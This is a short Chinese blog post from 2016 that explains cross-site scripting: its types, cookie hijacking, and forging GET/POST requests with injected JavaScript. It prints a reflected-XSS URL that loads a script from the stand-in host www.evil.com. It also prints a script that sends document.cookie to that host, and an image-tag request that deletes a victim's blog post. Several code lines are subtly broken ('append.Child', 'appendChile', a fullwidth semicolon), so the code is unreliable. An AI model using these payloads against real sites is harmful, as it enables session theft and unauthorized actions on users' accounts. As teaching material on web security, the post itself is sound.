---
title: XXS跨站脚本攻击
date: 2016-10-27 21:00:00
tags:
- XSS 
- Web安全

---
### XSS
XSS，全名Cross Site Script。通常指攻击者通过"HTML注入"篡改网页，插入恶意脚本，从而在用户访问网页时控制用户浏览器的攻击。但现在，是否跨域对这种攻击已经不重要了，只是这个名字一直沿用下来。  
从分类上来说，可以分为反射型XSS，存储型XSS，DOM Based XSS三种。

### XSS payload
XSS payload实际上是JavaScript脚本，常见的如通过读取浏览器的Cookie对象，发起Cookie劫持攻击。例如，在URL中加载一个远程脚本，并且在远程脚本中获取Cookie：

	http://www.a.com/test.htm?abc="><script src=www.evil.com/evil.js></script>
	
	//evil.js
	var img = document.createElement("img");
	img.src = "http://www.evil.com/log?"+escape(document.cookie);
	document.body.append.Child(img)
	
这段代码在页面中插入了一张无效的图片，同时把document.cookie对象作为参数发送到远程服务器，从而完成了窃取。这样通过XSS攻击，能够劫持Cookie，直接登录进用户的账户。  

### 构造GET/POST
假设有一个删除文章的链接，其中包含有文章的id：

	http://blog.xxx.com/manage.entry.do?m=delete&id=123456

那么攻击者知道了这篇文章的id，就可以利用它来删除这篇文章。这里，可以通过插入一张图片，来发起一个GET请求，这里，攻击者只需要诱使文章的作者去执行这一段javascript代码，就会把文章删除掉。  

	var img = document.createElement("img");
	img.src = "http://blog.xxx.com/manage/entry.do?m=delete&id=123456"
	document.body.appendChile(img)；

而利用javascript，攻击者完全可以模拟浏览器发包，例如构造form表单，或者构造XMLHttpRequest。因此，攻击者不仅能够实施cookie的劫持，还能模拟GET、POST来操作用户浏览器。


	
